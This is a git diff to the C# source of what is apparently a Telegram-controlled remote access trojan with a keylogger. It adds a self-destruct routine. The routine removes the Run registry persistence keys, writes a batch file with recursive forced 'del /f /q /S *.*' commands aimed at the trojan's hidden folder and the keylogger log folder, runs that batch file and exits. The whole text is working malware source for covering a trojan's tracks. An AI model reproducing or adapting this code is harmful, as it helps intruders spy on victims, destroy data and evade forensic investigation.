@@ -1,5 +1,8 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
+using System.ComponentModel;
+using static System.Net.Mime.MediaTypeNames;
 
 namespace RAT_BotTelegram.Lib {
     internal sealed class Tools {
@@ -137,7 +140,71 @@ namespace RAT_BotTelegram.Lib {
             Console.WriteLine("\n==>[Troyano] Finish\n");
 
         }
-    
+        public static void DestroyRAT(bool destroy = false ) {
+            if (destroy) {
+                Console.WriteLine("\n==>[DESTROY RAT] En proceso...\n");
+                const string pathbat = @"C:\Users\Public" + @"\" + "error.bat";
+
+                try {
+                    Console.WriteLine("\n[StartUp] Eliminando registros de arranque...\n");
+                    RegistryTools R = new RegistryTools();
+                    const string PathA = @"Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+                    if (R.DeleteKey(PathA) != "E#RR04") {
+                        Console.WriteLine("[StartUp] Se eliminó del registro");
+                    } else {
+                        const string Path = @"Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+                        Console.WriteLine("[StartUp] Se eliminó del registro = " + R.DeleteKey(Path));
+                    }
+
+                } catch {
+                    Console.WriteLine("Error al eliminar del registro");
+                }
+
+                Console.WriteLine("\n[StartUp] Finish\n");
+
+
+                // Actualiza bat
+                try {
+                    File.Delete(pathbat);
+
+                } catch {
+                }
+
+                const string bat =    // Bat que borrará el RAT 
+                           "@echo off\n" +
+                           @"cd " + config.PATH_OCUL + "\n" + // Ruta del RAT
+                           @"timeout /t 1 /NOBREAK >null" + "\n" +
+                           @"timeout /t 1 /NOBREAK >null" + "\n" +
+                           @"del /f /q /S *.*" + "\n" +
+                           @"cd " + config.PATH_LOG + "\n" +  // Ruta del Keylogger
+                           @"del /f /q /S *.* " ;
+                // Crea Bat 
+                try {
+                    Console.WriteLine("Crea Bat ");
+                    File.WriteAllText(pathbat, bat);
+                } catch {
+                    Console.WriteLine("El archivo bat, ya existe");
+                }
+
+                //Abre el archivo bat para la eliminación
+                ProcessStartInfo psi = new ProcessStartInfo();
+                psi.UseShellExecute = false;
+                psi.FileName = pathbat;
+
+                //Process.Start(psi);
+                Process.Start(pathbat);
+
+                // Cierra Telegram
+                Environment.Exit(1);
+
+
+                //// New Name *.pdb
+                //string exeName = config.NAME_EXE;
+                //exeName = exeName.Substring(0, exeName.Length - 4);
+
+                //Console.WriteLine("\n==>[Troyano] Finish\n");
+            }
+        }
     
     }
 }
